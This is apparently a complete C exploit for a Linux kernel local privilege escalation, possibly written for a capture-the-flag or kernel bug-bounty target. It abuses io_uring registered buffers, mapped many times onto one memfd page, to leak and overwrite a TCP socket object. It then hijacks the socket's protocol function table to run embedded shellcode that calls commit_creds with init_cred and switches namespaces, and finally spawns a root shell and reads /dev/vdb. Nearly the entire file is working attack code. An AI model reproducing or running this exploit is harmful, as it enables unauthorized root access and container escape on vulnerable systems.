#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <liburing.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#include <linux/btrfs.h>
#include <linux/capability.h>
#include <linux/sysctl.h>
#include <linux/types.h>
#include <linux/userfaultfd.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include "sock.h"

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...)                                                           \
  do {                                                                         \
  } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

#define SAFE(result)                                                           \
  ({                                                                           \
    typeof(result) _r = (result);                                              \
    if (_r < 0)                                                                \
      logErr("%s:%d: returned 0x%lx", __FILE__, __LINE__, (unsigned long)_r);  \
    _r;                                                                        \
  });

#define PAGE_SIZE 0x1000

#define __ALIGN_MASK(x, mask) (((x) + (mask)) & ~(mask))
#define ALIGN(x, a) __ALIGN_MASK(x, (typeof(x))(a) - 1)

// important for these two values to be correct!
#define L1_CACHE_SHIFT 6
#define sk_buff_size 224

#define SOCK_MIN_SNDBUF 2 * (2048 + ALIGN(sk_buff_size, 1 << L1_CACHE_SHIFT))

u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;

static inline void panic(const char *format, ...) {
  va_list args;
  va_start(args, format);
  vprintf(format, args);
  va_end(args);
  exit(EXIT_FAILURE);
}

u8 WAIT() {
  write(STDERR_FILENO, "[WAITING...]\n", 13);
  u8 c;
  read(STDIN_FILENO, &c, 1);
  return c;
}

void getShell() {
  if (getuid()) {
    panic("NO ROOT");
  }
  logOK("Rooted!");
  char *argv[] = {"/bin/sh", NULL};
  char **envp = &argv[1];
  execve(argv[0], argv, envp);
}

void save_state() {
  __asm__("mov [rip + user_cs], cs\n"
          "mov [rip + user_ss], ss\n"
          "mov [rip + user_sp], rsp\n"
          "mov [rip + user_ip], %0\n"
          "pushf\n"
          "pop qword ptr [rip + user_rflags]\n" ::"r"(getShell));
  logInfo("Saved user state");
}

void pin_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    panic("sched_setaffinity");
  }
}

int setup_memfd_page(char *name, int real_pages) {
  /* sets up a memfd and calls fallocate */
  int memfd = memfd_create(name, MFD_CLOEXEC);

  // we allocate the needed memory in memfd
  fallocate(memfd, 0, 0, real_pages * PAGE_SIZE);
  return memfd;
}

void *vmap_shallow_pages(int nr_pages, int memfd) {
  /* maps nr_pages consecutive virtual pages to a single physical one */

  uint64_t start = 0x4247000000;
  for (int i = 0; i < nr_pages; i++) {
    if (mmap((void *)start + i * PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE,
             MAP_SHARED | MAP_FIXED, memfd, 0) < 0) {
      perror("Failed to mmap a page");
      exit(0);
    }
  }
  return (void *)start;
}

void *dump_buffer(void *buffer, int size) {
  for (int i = 0; i < (size / 16); i++) { // split to 16-byte (2 word) "lines"
    uint64_t **at;
    at = buffer + i * 16;
    // non-zero mode
    if (*at == 0x0 && *(at + 1) == 0x0)
      continue;

    printf("0x%llx: 0x%llx 0x%llx\n", at, *at, *(at + 1));
  }
  return NULL;
}

uint64_t seek_value(void *buffer, int size, uint64_t value) {
  for (int off = 0; off < size;
       off = off + 8) { // split to 16-byte (2 word) "lines"
    uint64_t **at;
    at = buffer + off;
    if (*at == value)
      return off;
  }
  return -1;
}

u64 kBase;
#define TCP_OFFSET 1400

void __attribute__((naked)) shellcode() {
  asm("mov r15, [rsp]\n"           // r15 = __sys_getsockopt+180
      "sub r15, 0xa01bb4\n"        // r15 = kBase
      "lea rdi, [r15+0x1a5f8c0]\n" // init_cred
      "lea rax, [r15+0xdb900]\n"   // commit_creds
      "call rax\n"
      "mov edi, 1\n"
      "lea rax, [r15+0xcf710]\n" // find_task_by_vpids
      "call rax\n"
      "mov rdi, rax\n"
      "lea rsi, [r15+0x1a5f620]\n" // init_nsproxy
      "lea rax, [r15+0xd9920]\n"   // switch_task_namespaces
      "call rax\n"
      //"mov eax, -1\n"
      "add qword ptr [rsp], 0x3f\n"
      "ret\n");
}

int main(int argc, char **argv, char **envp) {
  pin_cpu(0);

  struct io_uring ring;
  int i, fd, ret, pending, done;
  struct io_uring_sqe *sqe;
  struct io_uring_cqe *cqe;
  struct iovec *iovecs;
#define QD 4

  SAFE(io_uring_queue_init(QD, &ring, 0));

  struct rlimit max_files;
  getrlimit(RLIMIT_NOFILE, &max_files);
  max_files.rlim_cur = max_files.rlim_max;
  setrlimit(RLIMIT_NOFILE, &max_files);

  int limit = max_files.rlim_cur - 20;
  int nr_memfds = limit / 2;
  int nr_sockets = limit - nr_memfds;
  int *memfds = calloc(nr_memfds, sizeof(*memfds));
  int nr_maps = 65000; // good number

  for (int i = 0; i < nr_memfds; i++) {
    memfds[i] = setup_memfd_page("memfd_x", 1);
  }

  uint64_t egg = 0xdeadbeefdeadbeef;
  int *sockets = calloc(nr_sockets, sizeof(*sockets));
  for (int i = 0; i < nr_sockets; i++) {
    if ((sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
      panic("socket creating failed");
    if (setsockopt(sockets[i], SOL_SOCKET, SO_MAX_PACING_RATE, &egg,
                   sizeof(uint64_t)) < 0)
      panic("setting pacing rate failed");
    int j =
        sockets[i] +
        SOCK_MIN_SNDBUF; // file descriptor of the socket + 4608 (because min(j,
                         // 4608) will be performed to select the value)
    if (setsockopt(sockets[i], SOL_SOCKET, SO_SNDBUF, &j, sizeof(int)) < 0)
      panic("failed to set SO_SNDBUF");
  }

  int block_size = 500; // leaking in blocks of 500 pages

  struct iovec iovec;

  int receiver_fd = setup_memfd_page("receiver", block_size);
  void *receiver_buffer =
      mmap(0, block_size * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED,
           receiver_fd, 0);

  int success = 0;
  for (int i = 0; i < nr_memfds && success == 0; i = i + 1) {
    void *buffer = vmap_shallow_pages(nr_maps, memfds[i]);
    iovec.iov_base = buffer;
    iovec.iov_len = PAGE_SIZE * nr_maps;
    ret = io_uring_register_buffers(&ring, &iovec, 1);

    // walk through the virtual pages block_size pages at a time
    // ATTENTION: in this loop you will observe sacrilegious use of asserts -
    // proceed with caution!
    for (int v_off = 0; v_off < (nr_maps - block_size);
         v_off = v_off + block_size) {
      printf("memfd: %d, page: %d at virt_addr: %p, reading %lu bytes\n", i,
             v_off, iovec.iov_base + v_off, iovec.iov_len);
      if (ret < 0) {
        printf("Error in registering the buffers\n");
        puts(strerror(-ret));
        return 1;
      }
      // Lets leak stuff
      sqe = io_uring_get_sqe(&ring);
      // printf("Receiver buffer: %p\n", receiver_buffer);
      io_uring_prep_write_fixed(sqe, receiver_fd, buffer + v_off * PAGE_SIZE,
                                block_size * PAGE_SIZE, 0, 0);
      ret = io_uring_submit(&ring);
      if (ret < 0) {
        printf("io_uring_submit: %s", strerror(-ret));
        exit(0);
      }
      io_uring_wait_cqe(&ring, &cqe);
      io_uring_cqe_seen(&ring, cqe);

      uint64_t egg_off =
          seek_value(receiver_buffer, PAGE_SIZE * block_size, egg);
      if (egg_off == -1) // wasn't found here
        continue;

      if (*(uint64_t *)(receiver_buffer + egg_off) !=
          *(uint64_t *)(receiver_buffer + egg_off + 8))
        continue;
      // logInfo("eggPage: %p", eggPage);
      logInfo("dup: %p", receiver_buffer + egg_off);
      uint64_t sock_off = egg_off - offsetof(struct sock, sk_pacing_rate);
      logInfo("Found value 0x%lx at offset 0x%lx\n", egg, egg_off);
      logInfo("Socket object starts at offset 0x%lx\n", sock_off);

      struct sock *relative_obj_addr = receiver_buffer + sock_off;
      uint64_t real_obj_addr;
      real_obj_addr = (u64)relative_obj_addr->sk_error_queue.next -
                      offsetof(struct sock, sk_error_queue);
      logOK("our struct sock object starts at 0x%lx\n", real_obj_addr);
      kBase =
          (u64)relative_obj_addr->sk_state_change - 0xa03f70; // sock_def_wakeup
      logOK("kBase: 0x%lx", kBase);

      relative_obj_addr->__sk_common.skc_prot =
          (void *)((void *)real_obj_addr +
                   offsetof(struct sock, sk_pacing_rate) -
                   offsetof(struct proto, ioctl));

      *(uint64_t *)(receiver_buffer + egg_off) = kBase + 0x961d0; // ioctl
      *(uint64_t *)(receiver_buffer + egg_off +
                    offsetof(struct proto, getsockopt) -
                    offsetof(struct proto, ioctl)) =
          (u64)relative_obj_addr->__sk_common.skc_prot +
          offsetof(struct proto, bind) + 8;

      memcpy(receiver_buffer + egg_off + offsetof(struct proto, bind) -
                 offsetof(struct proto, ioctl) + 8,
             shellcode, 71);

      void *temp = malloc(PAGE_SIZE);
      memcpy(temp, receiver_buffer + sock_off, PAGE_SIZE);
      memcpy(receiver_buffer, temp, PAGE_SIZE);

      // Lets leak stuff
      sqe = io_uring_get_sqe(&ring);
      io_uring_prep_read_fixed(sqe, receiver_fd,
                               buffer + v_off * PAGE_SIZE + sock_off, PAGE_SIZE,
                               0, 0);
      ret = SAFE(io_uring_submit(&ring));

      WAIT();

      for (int i = 0; i < nr_sockets; ++i) {
        ioctl(sockets[i], 0x1, 0x1337);
      }

      int sockbufsize;
      socklen_t size;
      for (int i = 0; i < nr_sockets; ++i) {
        getsockopt(sockets[i], 0x13, SO_RCVBUF, (char *)&sockbufsize, &size);
      }

      system("mount -t devtmpfs none dev ; cat /dev/vdb; bash");
      success = 1;
      break;
    }
    io_uring_unregister_buffers(&ring);
    munmap(buffer, nr_maps * PAGE_SIZE);
  }

  logOK("OK");
}